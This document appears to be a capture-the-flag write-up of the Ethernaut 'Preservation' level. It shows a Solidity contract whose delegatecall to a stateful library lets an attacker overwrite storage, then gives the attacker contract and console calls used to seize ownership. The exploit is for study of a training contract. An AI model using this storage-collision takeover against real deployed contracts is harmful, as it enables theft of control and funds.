# Preservation

## Challenge Description

This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.

The goal of this level is for you to claim ownership of the instance you are given.

Things that might help

-   Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
-   Understanding what it means for `delegatecall` to be context-preserving.
-   Understanding how storage variables are stored and accessed.
-   Understanding how casting works between different data types.

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(
        address _timeZone1LibraryAddress,
        address _timeZone2LibraryAddress
    ) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    function setFirstTime(uint _timeStamp) public {
        timeZone1Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }

    function setSecondTime(uint _timeStamp) public {
        timeZone2Library.delegatecall(
            abi.encodePacked(setTimeSignature, _timeStamp)
        );
    }
}

contract LibraryContract {
    uint storedTime;

    function setTime(uint _time) public {
        storedTime = _time;
    }
}
```

## Challenge Solution Walkthrough

To exploit the contract and become the owner, we can take advantage of the delegate call mechanism and manipulate the memory layout. By executing specific functions, we can modify the contract's state and assign ourselves as the owner.

Here's how we can achieve this:

1. Deploy the following `PreservationSolution` contract, which has the same memory layout as the `Preservation` contract and includes a `setTime(uint256)` function that changes the owner:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract PreservationSolution {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint256) public {
        owner = tx.origin;
    }
}
```

1. Obtain its address (let's assume it is `0xFd414A1E706dF6F30B8c7F7e1AB298C248cb6dDc`).
2. Call the `setFirstTime()` function on the `Preservation` contract, passing the address of the `PreservationSolution` contract as the input:

```javascript
> await contract.setFirstTime("0xFd414A1E706dF6F30B8c7F7e1AB298C248cb6dDc")
```

This step modifies the memory layout of the `Preservation` contract, assigning the address of `timeZone1Library` to the input address.

4. Call the `setFirstTime()` function on the `Preservation` contract again, passing `"0"` as the input. Since the address of `timeZone1Library` has been changed to our deployed `PreservationSolution` contract, this function will execute the `setTime(uint256)` function of the `PreservationSolution` contract, which changes the owner to `tx.origin` (our address):

```javascript
> await contract.setFirstTime("0")
```

After executing this step, we will become the owner of the `Preservation` contract.

5. To validate the result, execute the following code:

```javascript
> await contract.owner() == player
< true
```

The output should indicate that we are now the owner of the contract.

Congratulations! You have successfully completed the challenge.

## Challenge Description After Solving

As the previous level, `delegate` mentions, the use of `delegatecall` to call libraries can be risky. This is particularly true for contract libraries that have their own state. This example demonstrates why the `library` keyword should be used for building libraries, as it prevents the libraries from storing and accessing state variables.
